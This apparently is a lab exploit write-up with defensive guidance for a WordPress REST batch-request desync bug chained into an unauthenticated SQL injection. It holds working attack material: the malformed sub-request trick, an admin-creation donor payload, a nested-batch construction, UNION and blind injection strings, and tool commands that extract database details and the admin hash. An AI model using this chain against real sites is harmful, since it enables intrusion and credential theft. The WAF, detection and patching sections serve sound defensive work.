# wp2shell (CVE-2026-63030) — Full Exploit Chain & Defensive Measures

**Audience:** WordPress platform security owner (defensive derivation).
**Scope:** Authorized lab `TARGET`. This document takes the confirmed *primitive* from
`weaponization-gap.md` and builds it into a **working, demonstrated exploit chain**, then derives
detection and mitigation. All lab changes made for this exercise have been reverted; the lab is back
on patched **7.0.2 / NOT VULNERABLE**.

---

## 0. What changed vs. the prior gap analysis

The gap analysis stopped at "attacker-controlled handler substitution is demonstrated; onward RCE is
characterized, not constructed." Two corrections and one construction were produced here:

1. **Correction — the target handler need NOT be batch-enabled.** The gap analysis audited only the
   110 *batch-enabled* handlers as candidate targets and concluded "0 batch-enabled AND public-gated."
   That is the wrong set. The `allow_batch` gate is checked **only in the validation loop**, against
   each request's *own* correctly-matched handler. In the **execution loop** the drifted handler is
   pulled from `$matches[$i]` and run with **no `allow_batch` re-check**. So the *executed* handler can
   be **any of the 204 registered handlers on this build** (82 of them accept a write method), not just
   the batch-enabled ones. Only the *donor* sub-request must be batch-enabled.

2. **Correction — this is NOT an authentication bypass.** Confirmed from source (`respond_to_request`):
   the executed handler's **own** `permission_callback` still runs, against the donor request. Gate and
   callback come from the *same* drifted handler. A full route-table audit (below) shows **every**
   write-method handler in stock core is `current_user_can`-gated and denies an unauthenticated caller
   even when fed attacker-chosen parameters. **Single-request unauth RCE against stock core does not
   exist.** The bug's real teeth are three *other* primitives (§2).

3. **Construction — the working clean-core chain.** A **nested (batch-in-batch)** application of the
   desync reaches the `WP_Query` `author__not_in` SQL injection (CVE-2026-60137) in the posts `get_items`
   handler and reads the database unauthenticated — no plugins required (§4).

---

## 1. The mechanism (verified against the live 7.0.1 source)

`serve_batch_request_v1()` builds three arrays over the sub-requests. In the **validation loop**, a
malformed sub-request (`path:"http://:"`, which fails `wp_parse_url`) pushes to `$validation` **but not
to `$matches`**:

```php
// VULNERABLE 7.0.1 — validation loop
foreach ( $requests as $single_request ) {
    if ( is_wp_error( $single_request ) ) {   // malformed
        $has_error    = true;
        $validation[] = $single_request;       // gets a slot
        continue;                              // <-- $matches[] does NOT   (THE BUG)
    }
    $match     = $this->match_request_to_handler( $single_request );
    $matches[] = $match;                       // valid requests only
    ...
    $validation[] = $error ?: true;
}
```

The **7.0.2 fix is exactly one line** — `$matches[] = $single_request;` added to the malformed branch,
re-aligning the arrays. Verified against the upstream fix commit (WordPress core is developed on
Trac/SVN; `WordPress/wordpress-develop` is the GitHub mirror of the changeset, released 2026-07-17 with
7.0.2 / 6.9.5):

- **Fix:** [`c8bdf1fa1235`](https://github.com/WordPress/wordpress-develop/commit/c8bdf1fa12355f79db94054d307d0e3898b501c9)
  — *"REST API: Ensure errors in batch requests propogate."* (adds `$matches[] = $single_request;` in
  `src/wp-includes/rest-api/class-wp-rest-server.php`).
- **Companion hardening (same release):**
  [`85015b84fbc5`](https://github.com/WordPress/wordpress-develop/commit/85015b84fbc5) —
  *"REST API: sub-requests must always use dispatch."*
- Reachable from the [`7.0.2` tag](https://github.com/WordPress/wordpress-develop/releases/tag/7.0.2).
  (No GitHub Security Advisory / GHSA record exists for CVE-2026-63030 in the GitHub Advisory Database as
  of this writing; the canonical fix record is the SVN changeset mirrored above, not a pull request.)

**Drift arithmetic.** With `k` leading malformed sub-requests, `$matches` is indexed by *valid* requests
only while `$requests`/`$validation` are indexed by *all* requests. In the execution loop
(`$match = $matches[$i]`), the request at position `i` is executed by the handler matched to the request
at position **`i + k`**. `respond_to_request($single_request=donor, $route, $handler=H, $error)` then runs
**H's** `permission_callback` and **H's** `callback`, but hands both the **donor** request object.

```
layout = [ MALFORMED x k , DONOR , TARGET , ... ]        (k = 1 is sufficient)
                            ^pos1   ^pos2
         -> DONOR(pos1) executed by TARGET(pos2)'s handler H, fed DONOR's body/params.
```

* **DONOR** — must be a **batch-enabled write route** whose `has_valid_params()`/`sanitize_params()`
  pass (so `$validation[pos1] === true`). No auth needed: **permission is never checked in the
  validation loop.** The donor's body carries the attacker payload for H. Its *own* handler never runs.
* **TARGET** — only *selects* H by `(method, path)`. H need not be batch-enabled. Batch sub-requests are
  restricted to `POST/PUT/PATCH/DELETE`, so H must accept a write method.
* **H's gate still runs** against the donor request (§0.2).

---

## 2. What the primitive actually gives an attacker

| Primitive | Unauth? | Demonstrated | Impact |
|---|---|---|---|
| **P1 — Handler substitution / authorization misrouting** | yes | §3a | A request is adjudicated + executed by the *wrong* registered handler. Integrity break. |
| **P2 — `allow_batch` allowlist bypass** | yes | §3a | A handler the site never batch-enabled executes inside a batch. The "which routes may be batched" control is void. |
| **P3 — Per-route input-validation/sanitization bypass** | yes | §4 | H's `has_valid_params()`/`sanitize_params()` **never run**; H's callback receives **raw** attacker input. Defeats schema `enum`/`sanitize_callback` filters — this is what lets a raw `author_exclude` string reach the SQLi sink. |
| **P4 — Request smuggling inside a batch envelope** | yes | §3/§4 | The dangerous request is hidden as sub-request N of a `batch/v1` POST (and, for the SQLi, inside a *nested* batch); naive URL/method WAF rules that watch the top-level request miss it. |
| ~~Auth bypass~~ | — | **disproven** §3b | H's own capability gate always runs. Not available. |

**Where this goes:** a single-level desync lands only on capability-gated core handlers (§3b), so it
does not by itself execute a dangerous callback unauthenticated. But **P3 + a nested batch** reaches a
core sink that *is* unauth-accessible — the `get_items` read handler — and delivers it an unsanitized
`author_exclude` string → the CVE-2026-60137 SQL injection (§4).

---

## 3. Live results on the lab (vulnerable 7.0.1)

Reintroduced by deploying the genuine WordPress 7.0.1 `class-wp-rest-server.php` (single-line revert)
and setting `$wp_version = '7.0.1'`. Detector flipped to VULNERABLE. Tooling: `wp2shell (this repo)`.

### 3a. Attacker-steered execution reaching a dangerous CORE handler (P1 + P2)

```
$ wp2shell seat http://TARGET/ \
    --donor-method DELETE --donor-path /wp/v2/posts/0 \
    --donor-body '{"username":"pwn","email":"pwn@evil.com","password":"...","roles":["administrator"]}' \
    --target-method POST --target-path /wp/v2/users
```

The unauthenticated caller steered the batch dispatcher to **execute core's "create user" handler**
(`WP_REST_Users_Controller::create_item`) — a route the caller never addressed — fed an
administrator-creation body via the donor. This is beyond the read-only probe: a *dangerous* handler was
seated and executed. The executed handler's own gate then answered:

```json
{ "code": "rest_cannot_create_user", "message": "Sorry, you are not allowed to create new users.", "data": { "status": 401 } }
```

→ **P1/P2 confirmed** (wrong handler executed, `allow_batch` irrelevant). → **the gate is the exact line
that holds** — proving §0.2 with a real attack, not theory.

### 3b. The unauth ceiling on stock core (why it stops here without a vulnerable route)

Unauthenticated route-table audit of this build (bootstrapped via `wp-load`, `current_user = 0`),
invoking **every** write-method handler's `permission_callback` with attacker-controlled parameters:

| metric | count |
|---|---|
| total registered handlers | 204 |
| write-method handlers (seatable targets) | 82 |
| write-method handlers whose gate PASSES unauthenticated (even with rich attacker params) | **1** — `/batch/v1` itself (recursion; no RCE) |

Every dangerous core write handler (`users`, `posts`, `settings`, `plugins`, `templates`, `media`, …)
is `current_user_can`-gated. `POST /wp/v2/comments` is the closest permissive write, but its gate
requires the `rest_allow_anonymous_comments` filter (default **false**). **Conclusion: no core handler
provides the permissive-gate + dangerous-callback pair, so a _single-request_, _single-shot_ unauth RCE
(one desync landing directly on a dangerous callback) against stock core is not reachable.**

> **Scope note — this is NOT "stock core is safe."** It holds only for a *single-level* desync landing on
> a *directly dangerous callback*. A **nested (batch-in-batch)** construction (§4, reproduced with our
> own tooling) reaches an unauthenticated `WP_Query` **SQL injection** (CVE-2026-60137) — full DB read,
> incl. admin password hashes — and per public disclosure escalates to RCE, with **no plugins**. That
> multi-step chain, not a single dangerous callback, is the real stock-core pre-auth exposure.

---

## 4. Clean-core pre-auth SQL injection (CVE-2026-60137 via the nested batch)

Public writeups describe "wp2shell" as a **clean-install, no-plugins** pre-auth RCE chaining the 63030
desync into **CVE-2026-60137**, a `WP_Query` SQL injection via an `author__not_in` string-vs-array
confusion. Below we (a) locate and **prove the exact sink** with our own SQL tracer, and (b) establish how
an unauthenticated request reaches it, using **our own exploit code** (`wp2shell (this repo)`) —
derived from the primitives in §2 and validated step-by-step against the lab.

> **Method correction.** An earlier pass concluded "not injectable." That pass was invalid: the lab's
> background auto-update to 7.0.2 (before we pinned it) had rewritten `class-wp-query.php` to the
> **patched** version, and only the dispatcher had been reverted — so we were tracing patched WP_Query.
> After deploying the **full genuine 7.0.1** `wp-includes`, the sink is present and the results below hold.

**The sink (CVE-2026-60137) — confirmed.** `WP_Query` in 6.9.0–6.9.4 / 7.0.0–7.0.1 gates its integer
casting behind an `is_array()` check (`class-wp-query.php`):

```php
if ( ! empty( $query_vars['author__not_in'] ) ) {
    if ( is_array( $query_vars['author__not_in'] ) ) {                 // string SKIPS this branch
        $query_vars['author__not_in'] = array_unique( array_map( 'absint', ... ) );
    }
    $author__not_in = implode( ',', (array) $query_vars['author__not_in'] );   // raw string survives
    $where .= " AND {$wpdb->posts}.post_author NOT IN ($author__not_in) ";     // <-- SQL injection
}
```

Feeding a raw *string* `author_exclude` (which maps to `author__not_in`) to `get_items`, our SQL tracer
captured the value landing **verbatim** in the `NOT IN (...)` clause (marker `ORGSQLI`):

```sql
SELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts
  WHERE 1=1 AND wp_posts.post_author NOT IN (ORGSQLI) AND ((wp_posts.post_type = 'post' ...
```

The string is interpolated with no quoting or casting — a genuine injection point. The 7.0.2 / 6.9.5 fix
replaces the `is_array`-gated cast with `wp_parse_id_list()` (sanitizes strings and arrays alike).

**Direct exploitation is blocked by the REST schema.** A normal `GET /wp/v2/posts?author_exclude=<string>`
returns **HTTP 400** — the args schema validates `author_exclude` as an array of integers and rejects the
string. So the SQLi requires bypassing that per-route validation — which is precisely what the desync's
**P3** does. This is why 60137 is described as needing 63030.

**Reachability — nested (batch-in-batch), derived and demonstrated with our own code.** A single-level
batch cannot seat `get_items` (§3b: sub-request methods are enum-locked to write verbs, and
`match_request_to_handler()` never falls a write method back to GET). But that enum is enforced by the
`/batch/v1` route's own `has_valid_params` — exactly the validation that **P3** skips for a drifted
handler — and `/batch/v1` is itself a public, POST-method handler (§3b). So apply the primitive twice:

1. **Outer** `[malformed, POST /wp/v2/posts (body = an inner batch), POST /batch/v1]`. The outer desync
   seats the batch-enabled posts donor under `serve_batch_request_v1`. Because that donor was validated as
   a *posts* request, its `body.requests` array was **never checked against the method enum** — so the
   inner batch may contain **GET** sub-requests.
2. **Inner** `[malformed, POST /wp/v2/posts (body: author_exclude=<payload>), GET /wp/v2/posts]`. The inner
   desync seats `get_items` on the posts donor; its `sanitize_params` never ran, so the raw
   `author_exclude` string reaches `WP_Query` → the 60137 sink.

We reached this by re-deriving from our own primitives (P3 + `/batch/v1` public + enum-in-`has_valid_params`)
and validating each step against the lab with our own SQL tracer — the raw string lands verbatim in the
`NOT IN (...)` clause:

```sql
SELECT SQL_CALC_FOUND_ROWS wp_posts.ID FROM wp_posts
  WHERE 1=1 AND wp_posts.post_author NOT IN (ORGSQLI) AND ((wp_posts.post_type = 'post' ...
```

**Demonstrated end-to-end** with our own tool (`wp2shell sqli`), **fully
unauthenticated**. It extracts via **UNION** (one request per value, and independent of whether the site
has any published posts): forcing `per_page=500` stops WP_Query's id-query/fetch split, so the injectable
query selects full `wp_posts.*` rows; we `AND 1=0` away the real rows and UNION a single fabricated
`publish`/`post` row whose `post_content` is `||HEX(<expr>)||`, which `get_items` returns in the REST
response. (A boolean-blind mode — `author_exclude = "0) AND (<cond>)-- -"`, which needs ≥1 published post —
is kept as a fallback.)

```
$ wp2shell sqli http://TARGET/
[+] UNION extraction working (one request/value, no published post required).
[+] table prefix: 'wp_'
    @@version    : 11.8.6-MariaDB-0+deb13u1
    current_user : wordpress@localhost
    database     : wordpress_db
    admin_login  : admin
    admin_hash   : $wp$2y$12$…[REDACTED]
```

**Conclusion (correcting an earlier draft of this section).** The **plugin-free, unauthenticated
63030→60137 SQLi chain DOES reproduce** on stock 7.0.1 — verified end-to-end with our own code. An earlier
pass concluded "not desync-reachable"; that was wrong because it considered only a *single-level* batch and
missed that the desync's validation-skip (P3) applies to the **batch handler itself**, so *nesting*
smuggles GET sub-requests (and unsanitized params) past the method enum. From this unauthenticated SQLi,
public disclosures report onward escalation to full RCE (admin creation → webshell); we reproduced the
**SQLi half organically** and did not rebuild the later stages. So **63030 is not merely an
authorization-integrity bug** — chained with 60137 through nested batch it yields unauthenticated data
exfiltration (and, per the disclosure, onward escalation to RCE) on stock core, no plugins.

### 4.2 From read to write: why the SQLi can't write directly, and the bridge that lets it

The obvious question is "why not just `UPDATE wp_users` / `INSERT` an admin from the injection?" On a
default install you can't, for three independent reasons — all worth understanding, because they explain
why the disclosed RCE chain is so convoluted:

- **Single-statement sink.** The injection is a `UNION`-able **`SELECT`** inside one `$wpdb` call
  (`get_items` → `WP_Query`), run via `mysqli_query`, which executes **one** statement. `1); UPDATE …-- `
  never runs — no stacked queries.
- **No DML in a SELECT.** MySQL/MariaDB does not allow `INSERT`/`UPDATE`/`DELETE` inside a `SELECT`
  subquery, so there is no in-band way to mutate a row.
- **No file write.** `SELECT … INTO OUTFILE` needs the global **`FILE`** privilege *and* a permissive
  `secure_file_priv`. On a stock lab both are denied: the WP DB user has `ALL PRIVILEGES ON <db>.*` but
  only `USAGE ON *.*` (no `FILE`), and `@@secure_file_priv` is `NULL` (OUTFILE disabled entirely).
- **No OS command exec.** MySQL/MariaDB has no `xp_cmdshell` (that is MSSQL). The equivalent — a
  `sys_exec()` UDF (`lib_mysqludf_sys`) — cannot be installed: it needs a writable `plugin_dir`
  (`/usr/lib/mysql/plugin/` is `root:root`) plus global `CREATE FUNCTION`/`FILE`, none of which the
  database-scoped WP user has, and `mysql.func` is empty (no pre-installed UDF to abuse).

So the DB account *can* write `wp_users` (it owns the database), but the injection **vector** can't reach
an `INSERT`/`UPDATE` or a file write. The attacker must therefore make **WordPress itself** perform the
write. The bridge, reproduced here with our own code:

- **Fabricated-post rendering → server-side action → real DB write.** Surfacing a UNION-fabricated
  `publish`/`post` row (with **ID `0`**) whose `post_content` is an `[embed]…[/embed]` shortcode causes
  `get_items` to render it (the `the_content` filters run oEmbed autoembed). Two effects, both confirmed
  live: (1) **the server issues an outbound request** to the embedded URL (the target fetched a loopback
  marker URL under the `WordPress/7.0.1` UA — an unauthenticated SSRF); and (2) because the rendering
  post's ID is `0`, WordPress caches the result as an **`oembed_cache` post inserted into `wp_posts`** — a
  genuine **unauthenticated database write** triggered entirely through the read-only SQLi. (With a
  non-zero post ID it caches to postmeta instead; the ID-`0` detail is what yields the `oembed_cache`
  post the chain needs.)

From there the disclosed chain is: persist an `oembed_cache` post → forge a `customize_changeset` owned by
an administrator → `parse_request` re-entry to borrow that identity → `POST /wp/v2/users` as admin →
webshell. The SQLi never writes; it steers WordPress's own privileged write paths.

**Reproduction status (honest):** we reproduced the chain up to and including the **write primitive** — the
UNION-fabricated post (ID 0) reliably causes WordPress to insert `oembed_cache` rows into `wp_posts` on
demand. The **final admin-elevation** (`customize_changeset`/`request`/`nav_menu_item` fabrication →
`parse_request` re-entry that sets `current_user` to the admin, so an appended `POST /wp/v2/users`
executes with `create_users`) was **attempted but not reproduced** here: it depends on the exact
Customizer re-entry preconditions the disclosers deliberately withheld, and a from-scratch reconstruction
did not trigger the identity borrow. So on this build we demonstrate unauth **DB read + DB write**; the
turnkey admin takeover remains the withheld crux.

---

## 5. Defensive measures (the deliverable)

### 5.1 Patch — the only complete fix
- **Update WordPress core to ≥ 7.0.2 / ≥ 6.9.5.** The one-line re-alignment closes P1–P4 outright
  (A/B re-run on 7.0.2 → donor judged by its own handler; detector → NOT VULNERABLE). Prioritize any
  host in **6.9.0–6.9.4 / 7.0.0–7.0.1**. Confirm with `wp2shell check <host>` (exit 1 =
  vulnerable) across the fleet.
- **Upstream fix commit (for change-review / patch verification):**
  [`c8bdf1fa1235`](https://github.com/WordPress/wordpress-develop/commit/c8bdf1fa12355f79db94054d307d0e3898b501c9)
  in `WordPress/wordpress-develop` (+ companion
  [`85015b84fbc5`](https://github.com/WordPress/wordpress-develop/commit/85015b84fbc5)); both under the
  [`7.0.2` tag](https://github.com/WordPress/wordpress-develop/releases/tag/7.0.2). See §1 for detail.
- **Confirm auto-update actually applied.** Core auto-updates can be disabled per-site
  (`AUTOMATIC_UPDATER_DISABLED`, `WP_AUTO_UPDATE_CORE`) or blocked by `DISALLOW_FILE_MODS` — such hosts
  will *not* self-patch. Verify the running version per host rather than assuming.

### 5.2 Virtual patch / WAF (until every host is patched)
High-fidelity request signatures — a legitimate client never sends these:
- **Malformed sub-request path.** Block any `POST` to `/wp-json/batch/v1` or `/?rest_route=/batch/v1`
  whose JSON `requests[*].path` fails to parse as a normal REST path — especially the exact
  `"http://:"` shape and any `requests[*].path` containing a scheme/authority (`://`) or not starting
  with `/`. This kills the drift trigger.
- **Response-side canary.** Flag any `batch/v1` response containing `block_cannot_read` (or any
  permission code) attributed to a sub-request that did not target that route — the misrouting tell.
- **Inspect inside the envelope (P4).** Ensure the WAF parses `batch/v1` JSON and applies the *same*
  per-route rules to each `requests[*]` (method, path, body) that it applies to top-level REST calls.
  Rules that only match the outer request are blind to smuggled sub-requests.
- **Nested-batch signature (the §4 SQLi chain).** Flag any `batch/v1` request where a sub-request
  `body` itself contains a `requests` array (a batch inside a batch), or a sub-request `path` of
  `/batch/v1` / `?rest_route=/batch/v1`. Nesting is how the exploit smuggles GET sub-requests and
  unsanitized params past validation; legitimate clients never nest batches.
- **`author_exclude`/`author`/`include`/`exclude` type check.** Flag non-integer-array values for these
  (scalar strings, or values containing `)`, `UNION`, `SELECT`, `--`, `ASCII(`, `0x`). Normal clients send
  integer arrays; a scalar string is the CVE-2026-60137 trigger.
- **Optionally disable batch** if unused: the `rest_get_max_batch_size` filter returning `0`, or block
  `/wp-json/batch/v1` at the edge. Batch v1 is used by the block editor; validate before disabling.

### 5.3 Plugin/theme exposure audit (the onward RCE surface)
The chain reaches RCE only through a non-core route with a **permissive gate + dangerous callback**.
Inventory and remediate these first:
- Enumerate every registered REST route and its `permission_callback`. Flag any **write-method** route
  (`POST/PUT/PATCH/DELETE`) whose gate is `__return_true`, `'__return_true'`, `null`/missing, or returns
  truthy for an anonymous request. (An unauthenticated `GET /wp-json/` lists namespaces; a
  `wp-load`-bootstrapped script or WP-CLI `wp rest ...` introspection like the audit in §3b enumerates
  handlers + gates precisely.)
- For each flagged route, treat the callback as the RCE sink: does it write files, `include`/`require`,
  `call_user_func`, `eval`, update options, or run SQL from parameters? Those are the plugins to patch,
  virtual-patch, or remove.
- **Do not rely on REST args-schema `sanitize_callback`/`enum`/`validate_callback` as a security
  boundary** while any host is unpatched — P3 bypasses all of it. Sanitize again inside the callback,
  at the sink.

### 5.4 Detection & monitoring
- Alert on `batch/v1` requests with a non-parseable `requests[*].path` (pre-block telemetry).
- Alert on `batch/v1` responses whose sub-request codes are permission errors on routes the sub-request
  did not target (misrouting), and on any `2xx` from a write route reached via `batch/v1`.
- File-integrity monitoring on `wp-content/uploads/**`, `mu-plugins/`, `plugins/`, `themes/` for new or
  modified `*.php` — catches webshell/backdoor drops from any onward plugin-route RCE.
- Review web logs for `POST /wp-json/batch/v1` (and `/?rest_route=/batch/v1`) from unauthenticated
  sources at elevated volume; baseline is near-zero from anonymous clients.

### 5.5 Hardening (defense-in-depth, independent of this CVE)
- Deny PHP execution under `wp-content/uploads/` at the web-server layer (Apache
  `<Directory>`/`.htaccess` or nginx `location` — no `.php` handler). Neutralizes the most common file-
  write-to-RCE sink even if a vulnerable route is reached.
- Enforce least privilege on REST: keep `rest_allow_anonymous_comments` off; audit any filter that
  loosens a core gate.
- Keep `DISALLOW_FILE_EDIT`/`DISALLOW_FILE_MODS` where feasible to shrink the authenticated RCE surface.

---

## 6. Reproduction & tooling

All demonstrations above use the `wp2shell` CLI in this repo (see `docs/USAGE.md`):

- `wp2shell check <url>` — non-destructive detector (exit 1 = VULNERABLE).
- `wp2shell probe <url>` — confirm the desync via the handler-substitution signal.
- `wp2shell seat <url> --donor-* --target-*` — execute an arbitrary handler H via the desync
  (the P1/P2/P3 primitive).
- `wp2shell sqli <url>` — the §4 clean-core unauthenticated SQL injection (UNION or blind).

This document was produced against controlled lab instances; host addresses and extracted credential
material have been redacted for publication.
